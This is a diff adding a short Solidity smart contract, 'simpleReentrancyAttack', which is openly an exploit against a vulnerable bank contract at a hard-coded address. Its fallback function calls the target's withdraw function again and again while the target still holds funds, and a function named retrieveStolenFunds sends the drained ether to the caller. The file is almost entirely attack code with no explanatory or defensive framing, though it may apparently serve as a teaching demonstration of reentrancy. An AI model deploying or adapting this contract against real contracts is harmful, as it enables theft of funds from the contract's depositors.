@@ -1,0 +1,38 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.6.10;
+
+//1r deposit
+//2n attack
+//3r retrievevalues
+
+interface targetInterface{
+    function deposit() external payable;
+    function withdraw(uint amt) external;
+}
+
+contract simpleReentrancyAttack{
+    targetInterface bankAddress = targetInterface(0xf8e81D47203A594245E36C48e151709F0C19fBe8);
+    uint256 amountDeposit = 0;
+
+    function deposit() public payable{
+        amountDeposit = msg.value;
+    }
+
+    function attack() public payable{
+        bankAddress.withdraw(amountDeposit);
+    }
+
+    function retrieveStolenFunds() public {
+        msg.sender.transfer(address(this).balance);
+    }
+
+    function getTargetBalance() public view returns(uint){
+        return address(bankAddress).balance;
+    }
+
+    fallback () external payable{
+     if (address(bankAddress).balance >= amountDeposit){
+         bankAddress.withdraw(amountDeposit);
+     }
+    }
+}
